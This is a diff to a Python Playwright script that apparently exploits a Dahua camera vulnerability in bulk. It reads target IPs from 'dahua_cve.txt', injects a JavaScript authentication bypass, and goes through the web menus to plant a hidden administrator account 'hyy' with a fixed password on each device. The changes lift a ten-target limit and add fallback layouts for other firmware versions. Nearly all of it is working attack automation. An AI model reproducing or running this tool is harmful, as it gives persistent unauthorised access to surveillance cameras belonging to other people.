@@ -16,6 +16,26 @@ jt_photo = Path(basepath, "dh_cev")
 jt_photo.mkdir(exist_ok=True)
 res_file = Path(basepath, "dh_cve_res.txt")
 
+# 按键位置配置
+keyConfigs = [
+    # 方案一
+    {
+        "set_xpath": '[t="w_Setup"]',
+        "xtgl_xpath": '[t="w_Sysmanager"]',
+        "yhgl_xpath": '[t="w_User Management"]',
+        "adduser_xpath": '[t="w_AddUser"]',
+        "save_xpath": 'xpath=/html/body/div[16]/div[3]/a[1]'
+    },
+    # 方案二
+    {
+        "set_xpath": '[t="com.Setting"]',
+        "xtgl_xpath": '[t="sys.SysManage"]',
+        "yhgl_xpath": '[t="sys.Account"]',
+        "adduser_xpath": '[t="sys.AddUser"]',
+        "save_xpath": 'xpath=/html/body/div[16]/div[3]/a[1]'
+    }
+]
+
 
 class Dahua(object):
     def __init__(self) -> None:
@@ -25,7 +45,7 @@ class Dahua(object):
             encoding="utf8")
         self.queue = Queue()
         with Path(basepath, "dahua_cve.txt").open(mode="r", encoding="utf8") as f:
-            for ip in f.read().strip().split("\n")[:10]:
+            for ip in f.read().strip().split("\n"):
                 self.queue.put(ip)
         logger.info(f"共有{self.queue.qsize()}条添加到队列.")
 
@@ -56,106 +76,69 @@ class Dahua(object):
             logger.error(f"[-] {addr}大华摄像头 token 获取失败{e}...")
             return False
 
-    async def run_v2(self, browser: Browser, addr):
-        """第二个版本"""
-        set_xpath = '[t="w_Setup"]'
-        xtgl_xpath = '[t="w_Sysmanager"]'
-        yhgl_xpath = '[t="w_User Management"]'
-        adduser_xpath = '[t="w_AddUser"]'
-        # /html/body/div[16]/div[2]/form/div[1]/div/input 用户名
-        # /html/body/div[16]/div[2]/form/div[2]/div/input 密码
-        # /html/body/div[16]/div[2]/form/div[4]/div/input 确认密码
-        save_xpath = 'xpath=/html/body/div[16]/div[3]/a[1]'
+    async def run(self, browser: Browser, addr):
+        """自适应多版本"""
 
         context = await browser.new_context()
         page = await browser.new_page()
-        await page.goto("http://"+addr)
+
+        await page.goto("http://"+addr, timeout=30*1000, wait_until="domcontentloaded")
+        await page.wait_for_timeout(10*1000)
 
         # 使用 js 脚本绕过
         await page.evaluate(self.js)
-        await page.wait_for_timeout(5*1000)
+        # await page.wait_for_timeout(5*1000)
 
-        try:
-            # 点击设置
-            await page.click(f"{set_xpath}")
-            await page.wait_for_timeout(3*1000)
-            # 点击系统管理
-            await page.click(
-                f"{xtgl_xpath}")
-            # 点击 系统管理->用户管理
-            await page.click(
-                f"{yhgl_xpath}")
-            await page.wait_for_timeout(4*1000)
-            # 点击增加用户
-            await page.click(
-                f"{adduser_xpath}")
-            await page.wait_for_timeout(5*1000)
-            # 输入用户名
-            await page.fill("id=use_AUserName", "hyy")
-            # 输入密码
-            await page.fill("id=use_AUserPwd", "12345678A")
-            # 确定密码
-            await page.fill("id=use_AUserPwdCfm", "12345678A")
-            # 保存
-            await page.click(f"{save_xpath}")
-            await page.wait_for_timeout(10*1000)
-            # 截图
-            await page.screenshot(path=Path(jt_photo, f"{addr}.png"))
-            return True
-        except playwright._impl._api_types.TimeoutError:
-            logger.error(f"{addr}使用方案二失败无药可救,错误截图保存")
-            await page.screenshot(path=Path(jt_photo, f"error-{addr}.png"))
-            return False
-        finally:
-            # await page.close()
-            await context.close()
+        for k, keyConfig in enumerate(keyConfigs):
+            # h5playerContainer
+            try:
+                # 点击设置
+                await page.click(f"{keyConfig['set_xpath']}", timeout=10*1000)
+                await page.wait_for_timeout(3*1000)
+                # 点击系统管理
+                await page.click(
+                    f"{keyConfig['xtgl_xpath']}")
 
-    async def run(self, browser: Browser, addr) -> bool:
-        """自动化添加用户"""
+                await page.evaluate(
+                    """
+                    var object2 = document.getElementById('h5playerContainer'); //通过id获取器获取对应元素
+                    if (object2 != null){
+                        object2.parentNode.removeChild(object2);     //删除对应的元素信息
+                    }
+                    """
+                )
 
-        context = await browser.new_context()
-
-        page = await browser.new_page()
-        await page.goto("http://"+addr)
-
-        # 使用 js 脚本绕过
-        await page.evaluate(self.js)
-        await page.wait_for_timeout(8*1000)
-
-        try:
-            # 点击设置
-            await page.click('[t="w_Setup"]', timeout=20)
-            await page.wait_for_timeout(3*1000)
-            # 点击系统管理
-            await page.click(
-                "xpath=/html/body/div[2]/div[2]/div[5]/div[1]/div[1]/ul/li[5]/a")
-            # 点击 系统管理->用户管理
-            await page.click(
-                "xpath=/html/body/div[2]/div[2]/div[5]/div[1]/div[1]/ul/li[5]/ul/li[2]")
-            await page.wait_for_timeout(4*1000)
-            # 点击增加用户
-            await page.click(
-                "xpath=/html/body/div[2]/div[2]/div[5]/div[1]/div[2]/div/div[2]/div/div[1]/div[2]/div[1]/div[3]/a")
-            await page.wait_for_timeout(5*1000)
-            # 输入用户名
-            await page.fill("id=use_AUserName", "hyy")
-            # 输入密码
-            await page.fill("id=use_AUserPwd", "12345678A")
-            # 确定密码
-            await page.fill("id=use_AUserPwdCfm", "12345678A")
-            # https://playwright.dev/python/docs/intro#timesleep-leads-to-outdated-state
-            # 保存
-            await page.click("xpath=/html/body/div[16]/div[3]/a[1]")
-            await page.wait_for_timeout(10*1000)
-            # 截图
-            await page.screenshot(path=Path(jt_photo, f"{addr}.png"))
-            return True
-        except playwright._impl._api_types.TimeoutError:
-            logger.info(f"使用方案二....")
-            return await self.run_v2(browser, addr)
-        finally:
-            await page.close()
-            await context.close()
+                # 点击 系统管理->用户管理
+                await page.click(
+                    f"{keyConfig['yhgl_xpath']}")
+                await page.wait_for_timeout(4*1000)
+                # 点击增加用户
+                await page.click(
+                    f"{keyConfig['adduser_xpath']}")
+                await page.wait_for_timeout(5*1000)
+                # 输入用户名
+                await page.fill("id=use_AUserName", "hyy")
+                # 输入密码
+                await page.fill("id=use_AUserPwd", "12345678A")
+                # 确定密码
+                await page.fill("id=use_AUserPwdCfm", "12345678A")
+                # 保存
+                # 滚动直到元素可见
+                # await page.wait_for_timeout(5*1000)
+                await page.wait_for_load_state('load')
+                await page.click(f"{keyConfig['save_xpath']}")
+                await page.wait_for_timeout(5*1000)
+                # 截图
+                await page.screenshot(path=Path(jt_photo, f"{addr}.png"))
+                return True
+            except playwright._impl._api_types.TimeoutError:
+                logger.error(f"{addr}使用方案{k+1}失败,正在切换方案....")
+                if k+1 == len(keyConfigs):
+                    logger.exception("使用全部方案均失败....截图保存当前页面...")
+                    await page.screenshot(path=Path(jt_photo, f"error-{addr}.png"))
+                    return False
+            finally:
+                pass
 
     async def async_run(self):
         async with async_playwright() as p:
@@ -173,17 +156,6 @@ class Dahua(object):
                         save_res(f"[-] {addr}错误.....")
 
     async def main(self):
-        # if self.get_token():
-        #     async with async_playwright() as p:
-        #         browser = await p.chromium.launch(headless=True)
-        #         try:
-        #             await self.run(browser)
-        #             save_res(f"[+] {self.ip}成功!")
-        #         except Exception as e:
-        #             logger.exception("运行出现错误!", e)
-        #             save_res(f"[-] {self.ip}错误.....")
-        # else:
-        #     logger.error("[-] 没有存在大华漏洞!")
         await asyncio.gather(
             *(
                 self.async_run()
@@ -195,7 +167,7 @@ class Dahua(object):
         """调试"""
         async with async_playwright() as p:
             browser = await p.chromium.launch(headless=False)
-            await self.run_v2(browser, "10.3.34.3")
+            await self.run(browser, "10.100.2.20")
 
 
 def filter():
